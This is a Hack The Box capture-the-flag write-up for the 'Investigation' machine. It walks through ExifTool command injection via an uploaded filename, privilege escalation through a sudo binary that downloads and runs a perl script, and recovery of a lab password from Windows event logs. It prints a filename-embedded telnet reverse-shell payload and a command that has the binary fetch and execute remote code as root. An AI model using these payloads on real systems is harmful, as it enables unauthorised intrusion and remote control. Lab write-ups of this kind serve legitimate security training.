+++ 
title = "Investigation HTB Write up"
description = "Write up for the HTB machine 'Investigation'"
author = "greatmoves"
tags = ["exiftool", "perl", "hackthebox", "binary ninja", "reverse engineering", "sudo -l", "digital forensics", "linux"]
date = 2023-03-02
+++
- [1. Initial Recon](#1-initial-recon)
  - [1.1. nmap](#11-nmap)
  - [1.2. nikto](#12-nikto)
- [2. website recon](#2-website-recon)
  - [2.1. ExifTool](#21-exiftool)
- [3. user.txt](#3-usertxt)
  - [3.1. file system recon](#31-file-system-recon)
  - [3.2. .msg file](#32-msg-file)
- [4. root.txt](#4-roottxt)
  - [4.1. investigating the binary](#41-investigating-the-binary)
    - [4.1.1. binary ninja](#411-binary-ninja)
    - [4.1.2. final payload](#412-final-payload)

## 1. Initial Recon
----
### 1.1. nmap
cmd `nmap -sC -sV 10.10.11.197`
- From the nmap scan we get the url `http://eforenzics.htb/` which we can add to /etc/hosts
- We have port 22 ssh and port 80 http
### 1.2. nikto
cmd `nikto -host 10.10.11.197`
- found nothing interesting
## 2. website recon
----
- /service.html has a file upload service
    - uploading any image file reveals the ExifTool Version Number 12.37
### 2.1. ExifTool
A quick google search for ExifTool reveals a command injection vulnerability for that version number
- https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429
  - ```Exiftool versions < 12.38 are vulnerable to Command Injection through a crafted filename. If the filename passed to exiftool ends with a pipe character | and exists on the filesystem, then the file will be treated as a pipe and executed as an OS command.```

Our payload will be in the name of the file that we upload to the web application

After trying some payloads from revshells we can eventually use:
- payload: `TF=$(mktemp -u);mkfifo $TF && telnet 10.10.x.x 4444 0<$TF | sh 1>$TF |`
## 3. user.txt
Once we have our reverse shell let's obtain a fully interactive shell with:
`python3 -c 'import pty;pty.spawn("/bin/bash");'`

### 3.1. file system recon
After some recon of the file system we find the directory `/usr/local/investigation`
- from here we can also find our username: `smorton`

Let's download the files

- On the victim machine spin up a http server using `python3 -m http.server`
- On your attacking machine run `curl http://10.10.11.197:8000/Windows%20Even%20Logs%20for%20Analysis.msg > out.msg`

### 3.2. .msg file
Now we need to find what to do with a `.msg` file. Thankfully we can use `https://www.encryptomatic.com/viewer/` to analyse it for us, which will lead us to downloading a zip file, extract the file from the zip.

Now we've got a `.evtx` file and we've gotta figure out what to do with that.
- here's a python module that can help with that `https://pypi.org/project/python-evtx/`
  - run `python3 evtx_dump.py security.evtx > out.json`

In the event logs we can look for basic logon events [Audit logon events (Windows)](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-audit-logon-events)
- The code `4625` is for a `Logon failure. A logon attempt was made with an unknown user name or a known user name with a bad password.`

We can search for this in the event log using `grep`
- `cat out.json | grep "4625" -C 10 > grep.out`
  
From the output of our grep command we can find a password: `Def@ultf0r3nz!csPa$$`

Now we can ssh into the machine with the credentials
```
smorton:Def@ultf0r3nz!csPa$$
```

navigate to `/home/smorton` for `user.txt`
## 4. root.txt
when we run `sudo -l` we can see that there's a binary the user is allowed to run
```
User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

So let's investigate this binary. Same as above let's spin up a http server using python3 on the victim machine and download the binary
- run `python3 -m http.server` on the victim machine
- run `curl http://10.10.11.197:8000/binary > binary.out` on your attacking machine

### 4.1. investigating the binary
let's start by running `strings binary.out`
```
...
Exiting... 
lDnxUysaQn
Running... 
perl ./%s
rm -f ./lDnxUysaQn
...
```

from this we can gather that
- perl is being run on a string
- `lDnxUysaQn` has some significance

#### 4.1.1. binary ninja
binary ninja allows us to decompile the binary and get an idea of what the main function of the binary is doing
{{< highlight c "linenos=inline" >}}
    0000144a      if (argc != 3)
    00001453          puts(str: "Exiting... ")
    0000145d          exit(status: 0)
    0000145d          noreturn
    00001469      if (getuid() != 0)
    00001472          puts(str: "Exiting... ")
    0000147c          exit(status: 0)
    0000147c          noreturn
    0000149d      if (strcmp(argv[2], "lDnxUysaQn") != 0)
    00001687          puts(str: "Exiting... ")
    00001691          exit(status: 0)
    00001691          noreturn
    000014aa      puts(str: "Running... ")
    000014c4      FILE* rax_8 = fopen(filename: argv[2], mode: &data_2027)
    000014cd      int64_t rax_9 = curl_easy_init()
    000014d6      int32_t var_40 = 0x2712
    000014f9      curl_easy_setopt(rax_9, 0x2712, argv[1], 0x2712)
    000014fe      int32_t var_3c = 0x2711
    0000151a      curl_easy_setopt(rax_9, 0x2711, rax_8, 0x2711)
    0000151f      int32_t var_38 = 0x2d
    0000153c      curl_easy_setopt(rax_9, 0x2d, 1, 0x2d)
    00001554      if (curl_easy_perform(rax_9) != 0)
    00001671          puts(str: "Exiting... ")
    0000167b          exit(status: 0)
    0000167b          noreturn
    00001583      int64_t rax_25 = sx.q(snprintf(s: nullptr, maxlen: 0, format: &data_202a, argv[2]))
    00001594      char* rax_28 = malloc(bytes: rax_25 + 1)
    000015c6      snprintf(s: rax_28, maxlen: rax_25 + 1, format: &data_202a, argv[2])
    000015ed      int64_t rax_37 = sx.q(snprintf(s: nullptr, maxlen: 0, format: "perl ./%s", rax_28))
    000015fe      char* rax_40 = malloc(bytes: rax_37 + 1)
    00001629      snprintf(s: rax_40, maxlen: rax_37 + 1, format: "perl ./%s", rax_28)
    00001635      fclose(fp: rax_8)
    00001641      curl_easy_cleanup(rax_9)
    0000164b      setuid(uid: 0)
    00001657      system(line: rax_40)
    00001663      system(line: "rm -f ./lDnxUysaQn")
{{< / highlight >}}

from this we can gather
- the program requires 2 arguments (line 1)
- the second argument must be `lDnxUysaQn` (line 9)
- curl is being used on argument 1 (line 17, line 22)
  - [man page for curl_easy_perform](https://linux.die.net/man/3/curl_easy_perform)
- perl is being run with system (line 31, line 35)

so let's construct a command to run on the victim machine so that it meets the above requirements

#### 4.1.2. final payload
`sudo /usr/bin/binary 10.10.x.x:80/payload.pl lDnxUysaQn`
- we need to be running the binary as sudo, so we need `sudo /usr/bin/binary` at the start
- the first argument is being curled, so let's use `python3 -m http.server 80` to host our payload
  - `10.10.x.x:80/payload.pl` is so the binary curls from our machine
- perl is being run, so let's make our payload a perl script for a reverse shell
  - from [revshells](https://www.revshells.com/) get a perl reverse shell
- finally, `lDnxUysaQn` is required at the end

Spin up the http server on your attacking machine along with a netcat listener

finally, our netcat listener will catch a reverse shell as the root user.